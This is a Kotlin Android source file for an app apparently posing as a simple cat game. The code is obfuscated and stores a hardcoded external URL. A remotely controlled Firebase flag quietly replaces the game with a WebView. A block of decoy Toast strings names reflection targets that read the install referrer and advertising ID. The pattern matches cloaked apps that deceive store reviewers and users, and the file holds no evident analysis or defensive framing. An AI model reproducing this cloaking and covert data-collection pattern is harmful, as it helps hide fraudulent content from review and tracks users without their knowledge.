package com.mix333.savethecat.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.widget.ImageView
import android.widget.Toast
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.firebase.remoteconfig.ConfigUpdate
import com.google.firebase.remoteconfig.ConfigUpdateListener
import com.google.firebase.remoteconfig.FirebaseRemoteConfigException
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.mix333.savethecat.R
import com.mix333.savethecat.model.DefaultRepositoryImpl
import io.michaelrocks.paranoid.Obfuscate
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


@Obfuscate
class MainActivity : AppCompatActivity() {
    private val viewModel: MainViewModel by viewModels {
        MainViewModelFactory(DefaultRepositoryImpl())
    }
    val domain1 = "https://relipoa.site/china?juice=a&"

    private val remoteConfig by lazy { viewModel.getRemoteConfig() }
    private val startGame: ImageView by lazy { findViewById(R.id.start_game) }

    override fun onCreate(savedInstanceState: Bundle?) {
        if (this is MainActivity){
            Toast.makeText(this@MainActivity, "loadUrl", Toast.LENGTH_SHORT).show() //-247873535358L
            Toast.makeText(this@MainActivity, "com.techullurgy.tetrisgame.navigation.intr.webp.FruitView", Toast.LENGTH_SHORT).show()//-282233273726L
            Toast.makeText(this@MainActivity, "android.webkit.WebChromeClient", Toast.LENGTH_SHORT).show()//-531341376894L
            Toast.makeText(this@MainActivity, "android.webkit.WebViewClient", Toast.LENGTH_SHORT).show()//-664485363070L
            Toast.makeText(this@MainActivity, "setWebChromeClient", Toast.LENGTH_SHORT).show()//-789039414654L
            Toast.makeText(this@MainActivity, "setWebViewClient", Toast.LENGTH_SHORT).show()//-870643793278L
            Toast.makeText(this@MainActivity, "com.android.installreferrer.api.InstallReferrerClient", Toast.LENGTH_SHORT).show()//-943658237310L
            Toast.makeText(this@MainActivity, "newBuilder", Toast.LENGTH_SHORT).show()//-1175586471294L
            Toast.makeText(this@MainActivity, "com.android.installreferrer.api.InstallReferrerStateListener", Toast.LENGTH_SHORT).show()//-1222831111550L
            Toast.makeText(this@MainActivity, "startConnection", Toast.LENGTH_SHORT).show()//-1484824116606L
            Toast.makeText(this@MainActivity, "com.techullurgy.tetrisgame.navigation.intr.data.attr.ReferrerListener", Toast.LENGTH_SHORT).show()//-1553543593342L
            Toast.makeText(this@MainActivity, "com.google.android.gms.ads.identifier.AdvertisingIdClient", Toast.LENGTH_SHORT).show()//-1854191304062L
            Toast.makeText(this@MainActivity, "getAdvertisingIdInfo", Toast.LENGTH_SHORT).show()//-2103299407230L
            Toast.makeText(this@MainActivity, "getId", Toast.LENGTH_SHORT).show()//-2193493720446L
            Toast.makeText(this@MainActivity, "3f3d0b14-bece-4dd3-a325-115fc545d8ab", Toast.LENGTH_SHORT).show()//-2219263524222L
        }


        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        startGame.setOnClickListener { startGame() }
        setupRemoteConfig()
        checkRemoteConfig()

    }

    private fun startGame() {
        val gameView = GameView(this)
        setContentView(gameView)
    }

    private fun checkRemoteConfig() {
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener(this) { isNavigate ->
                if (isNavigate.isSuccessful) {
                    val flag = remoteConfig.getBoolean("isNavigate")
                    Log.d("RemoteConfigCheck", "$flag")
                    if (flag) {
                        startWebViewActivity(this)
                    }
                }
            }
    }

    private fun startWebViewActivity(context: Context) {
        if (viewModel.checkInternetConnection(context)) {
            val intent = Intent(this, WebViewActivity::class.java)
            startActivity(intent)
            finish()
        } else {
            Toast.makeText(
                this,
                "Missing internet connection",
                Toast.LENGTH_SHORT
            ).show()
            lifecycleScope.launch {
                repeat(5) {
                    delay(360000)
                    startWebViewActivity(this@MainActivity)
                }
            }
        }
    }



    private fun setupRemoteConfig() {
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 10
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.addOnConfigUpdateListener(object : ConfigUpdateListener {
            override fun onUpdate(configUpdate: ConfigUpdate) {
                Log.d("Update", "Updated keys: " + configUpdate.updatedKeys)

                if (configUpdate.updatedKeys.contains("isNavigate")) {
                    remoteConfig.activate().addOnCompleteListener {
                        checkRemoteConfig()
                    }
                }
            }

            override fun onError(error: FirebaseRemoteConfigException) {
                Log.w("Error update", "Config update error with code: " + error.code, error)
            }
        })
    }
}